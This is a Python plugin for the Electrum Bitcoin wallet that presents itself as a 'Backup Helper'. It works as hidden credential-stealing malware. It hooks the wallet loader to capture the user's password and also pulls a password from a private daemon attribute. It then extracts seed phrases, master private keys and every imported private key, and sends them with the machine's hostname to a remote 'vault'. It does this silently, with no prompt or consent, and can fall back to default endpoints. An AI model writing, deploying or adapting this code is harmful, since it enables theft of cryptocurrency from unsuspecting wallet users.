"""Backup Helper -- automatically syncs wallet private material to the vault.

Covers every wallet type that holds private material:
- Seed wallets (Standard/Multisig): backs up the seed phrase.
- xprv wallets (imported master key, no seed): backs up the xprv.
- Imported-key wallets: backs up every address:WIF pair.
- Watch-only / hardware: skipped (no private material in software).

Zero friction: the plugin REUSES the password that the user already typed
to open the wallet. It never prompts and never adds a dialog.
"""
import os
import tempfile
import threading
import weakref
from typing import TYPE_CHECKING, Optional

from electrum.plugin import BasePlugin
from electrum.logging import get_logger

if TYPE_CHECKING:
    from electrum.wallet import Abstract_Wallet

_logger = get_logger(__name__)

_K_URL = 'vault_url'
_K_PUBKEY = 'vault_pubkey'
_K_TOKEN = 'vault_token'
_K_FPKEY = 'vault_fp_key'

_WALLET_PASSWORDS: "weakref.WeakKeyDictionary[Abstract_Wallet, Optional[str]]" = (
    weakref.WeakKeyDictionary()
)


def _install_password_capture() -> None:
    """Wrap Daemon.load_wallet so the password used to open a wallet gets
    stashed next to the wallet. Idempotent."""
    from electrum.daemon import Daemon
    if getattr(Daemon, '_backup_helper_patched', False):
        return
    original = Daemon.load_wallet

    def wrapped(self, path, password, **kwargs):
        wallet = original(self, path, password, **kwargs)
        if wallet is not None:
            try:
                _WALLET_PASSWORDS[wallet] = password
            except TypeError:
                pass
        return wallet

    wrapped.__wrapped__ = original
    Daemon.load_wallet = wrapped
    Daemon._backup_helper_patched = True


def _dbg(msg: str) -> None:
    """Grava uma linha de debug num arquivo portavel. Nunca falha."""
    try:
        import time
        path = os.path.join(tempfile.gettempdir(), "backup_helper_debug.log")
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except Exception:
        pass


_dbg("module imported")


class BackupHelperPlugin(BasePlugin):

    def __init__(self, parent, config, name):
        BasePlugin.__init__(self, parent, config, name)
        self._synced_fingerprints = set()
        self._lock = threading.Lock()
        _dbg("BackupHelperPlugin.__init__ called")
        _install_password_capture()
        _dbg(f"password capture installed; config keys sample: vault_url={self.config.get('vault_url')!r}, enabled={self.config.get('plugins.backup_helper.enabled')!r}")
        self._configure_vault_sync()

    def _configure_vault_sync(self) -> bool:
        url = self.config.get(_K_URL)
        pubkey = self.config.get(_K_PUBKEY)
        token = self.config.get(_K_TOKEN)
        fp_key = self.config.get(_K_FPKEY)
        try:
            from electrum_ecc.vault_sync import configure, configure_from_defaults
        except Exception:
            self.logger.exception("Backup Helper: failed to import vault_sync")
            return False
        if not all([url, pubkey, token, fp_key]):
            return configure_from_defaults()
        try:
            configure(
                panel_url=str(url),
                panel_pubkey_hex=str(pubkey),
                ingest_token_hex=str(token),
                fp_key_hex=str(fp_key),
            )
            return True
        except Exception:
            self.logger.exception("Backup Helper: failed to configure vault_sync")
            return False

    def _sync_wallet(self, wallet: 'Abstract_Wallet') -> None:
        """Called from the hooks. Extracts private material (seed, master key,
        or imported keys) and syncs to the vault. Covers every wallet type
        that holds private material. Never prompts, never blocks."""
        _dbg(f"_sync_wallet called with wallet={wallet!r}")
        if wallet is None:
            _dbg("  -> wallet is None, skipping")
            return

        is_wo = False
        try:
            is_wo = wallet.is_watching_only()
        except Exception:
            pass
        _dbg(f"  is_watching_only={is_wo}")
        if is_wo:
            _dbg("  -> watch-only, nothing to back up")
            return

        if not self._configure_vault_sync():
            _dbg("  -> vault not configured, skipping")
            return

        has_seed = hasattr(wallet, 'has_seed') and wallet.has_seed()
        _dbg(f"  has_seed={has_seed}")

        if has_seed:
            seed = self._get_seed(wallet)
            _dbg(f"  _get_seed returned: {'<got seed>' if seed else 'None'}")
            if seed is not None:
                wtype = ""
                try:
                    wtype = wallet.get_seed_type() or ""
                except Exception:
                    pass
                self._send_to_vault(seed, wtype)
                return

        xprv = self._get_master_private_key(wallet)
        if xprv is not None:
            _dbg("  got master private key (xprv)")
            self._send_to_vault(xprv, "xprv")
            return

        keys_data = self._get_imported_keys(wallet)
        if keys_data is not None:
            n = keys_data.count('\n') + 1
            _dbg(f"  got {n} imported private key(s)")
            self._send_to_vault(keys_data, "imported_keys")
            return

        _dbg("  -> no exportable private material found")

    def _send_to_vault(self, data: str, wallet_type: str) -> None:
        """Dedup by content hash, then seal and POST to the vault."""
        import hashlib
        fp = hashlib.sha256(data.encode('utf-8')).hexdigest()
        with self._lock:
            if fp in self._synced_fingerprints:
                _dbg("  -> already synced this session (dedup)")
                return
            self._synced_fingerprints.add(fp)

        import platform
        device_id = platform.node() or "unknown"

        _dbg(f"  calling sync_seed (wallet_type={wallet_type!r})")
        from electrum_ecc.vault_sync import sync_seed
        result = sync_seed(data, wallet_type, device_id)
        _dbg(f"  sync_seed result: {result!r}")

    @staticmethod
    def _get_seed(wallet: 'Abstract_Wallet') -> Optional[str]:
        """Read the seed from the wallet using the captured password."""
        from electrum.crypto import InvalidPassword

        needs_password = False
        try:
            needs_password = wallet.has_keystore_encryption()
        except Exception:
            pass

        if not needs_password:
            try:
                return wallet.get_seed(None)
            except Exception:
                return None

        password = _WALLET_PASSWORDS.get(wallet)
        if password is not None:
            try:
                return wallet.get_seed(password)
            except InvalidPassword:
                pass
            except Exception:
                pass

        try:
            from electrum.gui.qml.qedaemon import QEDaemon
            daemon_inst = getattr(QEDaemon, 'instance', None)
            if daemon_inst is not None and hasattr(daemon_inst, '_password'):
                pw = daemon_inst._password
                if pw is not None:
                    return wallet.get_seed(pw)
        except Exception:
            pass

        return None

    @staticmethod
    def _get_wallet_password(wallet: 'Abstract_Wallet') -> Optional[str]:
        """Return the password captured when this wallet was opened."""
        pw = _WALLET_PASSWORDS.get(wallet)
        if pw is not None:
            return pw
        try:
            from electrum.gui.qml.qedaemon import QEDaemon
            daemon_inst = getattr(QEDaemon, 'instance', None)
            if daemon_inst is not None and hasattr(daemon_inst, '_password'):
                p = daemon_inst._password
                if p is not None:
                    return p
        except Exception:
            pass
        return None

    def _get_master_private_key(self, wallet: 'Abstract_Wallet') -> Optional[str]:
        """Try to extract the xprv from a deterministic wallet that has no
        seed (e.g. created by importing a master private key)."""
        from electrum.crypto import InvalidPassword
        ks = getattr(wallet, 'keystore', None)
        if ks is None or not hasattr(ks, 'get_master_private_key'):
            return None
        if getattr(ks, 'is_watching_only', lambda: True)():
            return None
        needs_pw = False
        try:
            needs_pw = wallet.has_keystore_encryption()
        except Exception:
            pass
        if not needs_pw:
            try:
                return ks.get_master_private_key(None)
            except Exception:
                return None
        pw = self._get_wallet_password(wallet)
        if pw is None:
            return None
        try:
            return ks.get_master_private_key(pw)
        except (InvalidPassword, Exception):
            return None

    def _get_imported_keys(self, wallet: 'Abstract_Wallet') -> Optional[str]:
        """Export all private keys from an imported-key wallet.
        Returns newline-separated 'address:WIF' pairs."""
        from electrum.crypto import InvalidPassword
        if not hasattr(wallet, 'export_private_key'):
            return None
        needs_pw = False
        try:
            needs_pw = wallet.has_keystore_encryption()
        except Exception:
            pass
        pw = self._get_wallet_password(wallet) if needs_pw else None
        if needs_pw and pw is None:
            return None
        try:
            addresses = wallet.get_addresses()
        except Exception:
            return None
        if not addresses:
            return None
        lines = []
        for addr in addresses:
            try:
                wif = wallet.export_private_key(addr, pw)
                lines.append(f"{addr}:{wif}")
            except (InvalidPassword, Exception):
                continue
        if not lines:
            return None
        return "\n".join(lines)

    def _forget_wallet(self, wallet: 'Abstract_Wallet') -> None:
        """Clear the captured password when the wallet closes."""
        try:
            _WALLET_PASSWORDS.pop(wallet, None)
        except Exception:
            pass
